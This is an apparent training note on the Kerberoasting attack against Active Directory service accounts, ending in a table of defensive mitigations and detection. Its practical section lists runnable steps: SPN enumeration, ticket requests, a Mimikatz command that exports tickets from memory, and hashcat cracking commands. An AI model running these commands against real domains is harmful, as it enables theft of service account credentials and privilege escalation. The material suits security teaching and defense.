# 🎟️ Kerberoasting Attack & Service Account Abuse 

## 📖 1. Core Fundamental Concepts

### What is Kerberoasting?
**Kerberoasting** is a post-exploitation attack technique where an authenticated domain user requests a Kerberos Ticket Granting Service (**TGS**) ticket for a service account registered with a **Service Principal Name (SPN)**, exports the ticket from memory, and cracks the service account's plaintext password **offline**.

* **Why it works by design:** Any valid domain user can request a TGS ticket for *any* registered SPN in the Active Directory forest without triggering administrative permission checks.
* **The Root Vulnerability:** The ticket portion returned by the Domain Controller is encrypted using the target service account’s **NTLM hash**. The attacker extracts this ciphertext and performs offline dictionary attacks without interacting with the Domain Controller again (preventing account lockouts).

---

## 👥 2. Service Account vs. Normal User Account

| Comparison Vector | Normal User Account | Service Account (User-Configured SPN) |
| :--- | :--- | :--- |
| **Primary Purpose** | Human interactive logon (workstations, email, portal). | Runs automated background services (SQL, IIS, Web Portals, Backup). |
| **Password Complexity / Rotation** | Frequently enforced by Domain Password Policies (rotated every 30–90 days). | Often exempted from expiration to prevent production service outages; frequently uses weak/static passwords. |
| **SPN Association** | Usually no `servicePrincipalName` attribute configured. | Has one or more SPNs assigned (e.g., `MSSQLSvc/db01.corp:1433`, `HTTP/portal.corp`). |
| **Privilege Scope** | Standard domain user rights. | Frequently granted local administrative rights on host servers or Domain Admin roles. |

---

## 🔄 3. Kerberos Authentication & Kerberoasting Flow

```text
+---------------------------------------------------------------------------------------------------+
|                                 KERBEROASTING ATTACK FLOW (STEP-BY-STEP)                          |
+---------------------------------------------------------------------------------------------------+

   [ Domain User (Attacker) ]                                          [ Domain Controller (KDC) ]
              |                                                                     |
              | 1. AS-REQ: Authentication Request (Timestamp enc with user hash)   |
              |-------------------------------------------------------------------->|
              |                                                                     |
              | 2. AS-REP: Returns TGT (Encrypted with KRBTGT hash)                 |
              |<--------------------------------------------------------------------|
              |                                                                     |
              | 3. TGS-REQ: Requests TGS for SPN (Presents valid TGT + Target SPN)  |
              |-------------------------------------------------------------------->|
              |                                                                     |
              | 4. TGS-REP: Returns TGS Ticket (Encrypted with Service NTLM Hash!)  |
              |<--------------------------------------------------------------------|
              |
              |
              +--- 5. Export Ticket (.kirbi) from memory via Mimikatz
              |
              v
   [ Offline Cracking Engine ] (Kali / Hashcat / tgsrepcrack.py)
              |
              +---> 6. Brute-force NTLM Hash against password wordlist (RockYou)

```

---

## 🛠️ 4. Practical Step-by-Step Execution

### Step 1: Enumerate Service Accounts with Registered SPNs

Identify user accounts configured with Service Principal Names:

```powershell
# Approach A: Using PowerView
. .\PowerView_dev.ps1
Get-NetUser -SPN -Verbose

# Approach B: Built-in Windows Native Utility
setspn -T cyberwarfare.corp -Q */*

```

---

### Step 2: Request the TGS Ticket into Memory

Request the service ticket for the targeted SPN. This action loads the ticket directly into the current user's session cache.

```powershell
# Method 1: Using PowerView / PowerSploit
Request-SPNTicket

# Method 2: Using Native .NET Assembly (Built-in Windows - No custom scripts)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/portal.cyberwarfare.corp"

```

Verify that the ticket exists in memory:

```powershell
klist

```

*(Look for tickets with Server name matching the requested SPN, e.g., `HTTP/portal.cyberwarfare.corp`).*

---

### Step 3: Export Cached Tickets to Disk (`.kirbi`)

Extract the raw ticket from memory using Mimikatz:

```powershell
# Import Invoke-Mimikatz
. .\Invoke-Mimikatz.ps1

# Dump all Kerberos tickets from memory to current folder as .kirbi files
Invoke-Mimikatz -Command '"kerberos::list /export"'

```

---

### Step 4: Offline Password Cracking (Windows & Kali)

#### Option A: Cracking on Windows (`tgsrepcrack.py`)

```cmd
python.exe .\tgsrepcrack.py .\passwords.txt .\1-40a10000-employee@HTTP~portal.cyberwarfare.corp-CYBERWARFARE.CORP.kirbi

```

#### Option B: Cracking on Kali Linux

Transfer the `.kirbi` file to Kali:

```bash
# 1. Using tgsrepcrack.py directly on Kali:
python tgsrepcrack.py 10k-worst-pass.txt 1-40a10000-employee@HTTP~portal.cyberware.corp-CYBERWARFARE.CORP.kirbi

# 2. (Alternative) Convert .kirbi to Hashcat format and crack with Hashcat:
kirbi2hashcat.py 1-40a10000-employee@HTTP~portal.cyberware.corp-CYBERWARFARE.CORP.kirbi > krb5tgs.txt
hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt --force

```

---

## 🛡️ 5. Defensive Mitigations & Detection

| Defense Category | Mitigation / Detection Strategy |
| --- | --- |
| **Service Account Hardening** | Implement **Group Managed Service Accounts (gMSA)**. gMSAs use complex, randomly generated 128-character passwords that are automatically rotated by Active Directory, making offline brute-force attacks infeasible. |
| **Password Policy** | For legacy service accounts where gMSA cannot be deployed, enforce long, complex passphrases ($25+$ characters) to resist dictionary attacks. |
| **Encryption Downgrade Prevention** | Disable RC4-HMAC encryption support for Kerberos and enforce **AES-128 / AES-256** encryption for service accounts. |
| **Event Log Auditing** | Monitor **Windows Security Event ID 4769** (A Kerberos service ticket was requested). Alert on anomalous volumes of TGS requests with `Ticket Encryption Type: 0x17` (RC4) originating from non-administrative endpoints. |

```

```